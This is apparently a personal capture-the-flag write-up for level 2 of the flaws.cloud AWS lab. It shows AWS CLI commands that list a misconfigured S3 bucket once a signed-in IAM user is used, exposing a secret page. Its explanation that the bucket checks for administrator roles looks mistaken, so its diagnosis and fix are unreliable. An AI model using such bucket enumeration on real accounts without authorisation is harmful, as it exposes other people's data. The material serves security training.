# Flaws Cloud
### URl: http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/

# Level 2
### The next level is fairly similar, with a slight twist. You're going to need your own AWS account for this. You just need the free tier.

# Writeup
I tried to check of directory listing on this website using the following command, but, it seems, they have restricted access.
```
$ aws s3api list-objects-v2 --bucket level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud --region us-west-2 --no-sign-request
An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied
```

As it is giving is access denied, maybe we can create a user in AWS and then request to this particular endpoint and check whether it is working or not!

Let's start by going to (https://console.aws.amazon.com/iam/home#/users) and create user and get command line api id and secret.

We can configure aws id and secret using `aws configure`.

Now accessing same URL, AGAIN, it will give same access denied error. So what we can do is, give our newly created user full "AdministratorAccess". (from Add Permissions > select "AdministratorAccess").

Now, after giving administrator access, if we give another try, we got json in response

```
$ aws s3api list-objects-v2 --bucket level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud --region us-west-2

{
  "Contents": [
    {
      "Key": "everyone.png",
      "LastModified": "2017-02-27T02:02:15.000Z",
      "ETag": "\"d51ce30087f1fba84d6fb4d0cfc5f872\"",
      "Size": 80751,
      "StorageClass": "STANDARD"
    },
    {
      "Key": "hint1.html",
      "LastModified": "2017-03-03T03:47:17.000Z",
      "ETag": "\"ba4f41589527d0fa7fd4fb87a1f91348\"",
      "Size": 1433,
      "StorageClass": "STANDARD"
    },
    {
      "Key": "hint2.html",
      "LastModified": "2017-02-27T02:04:39.000Z",
      "ETag": "\"1641e5bb8e63e63a26bc16e07c9c563b\"",
      "Size": 1035,
      "StorageClass": "STANDARD"
    },
    {
      "Key": "index.html",
      "LastModified": "2017-02-27T02:02:14.000Z",
      "ETag": "\"bbc2900889794698e208a26ce3087b6f\"",
      "Size": 2786,
      "StorageClass": "STANDARD"
    },
    {
      "Key": "robots.txt",
      "LastModified": "2017-02-27T02:02:14.000Z",
      "ETag": "\"bbbcde0b15cabd06aace1df82d335978\"",
      "Size": 26,
      "StorageClass": "STANDARD"
    },
    {
      "Key": "secret-e4443fc.html",
      "LastModified": "2017-02-27T02:02:15.000Z",
      "ETag": "\"8207323f2b9dcfc5983421452f91ad5f\"",
      "Size": 1051,
      "StorageClass": "STANDARD"
    }
  ]
}
```

Boom, we got secret URL.

Next, Level 3: http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/


# How to stop this vulnerability
- Currently, it is just checking if the user has admin roles, if so, it will give bucket content in response. Instead of giving permission to all users, give specific permission to access bucket to specific users.
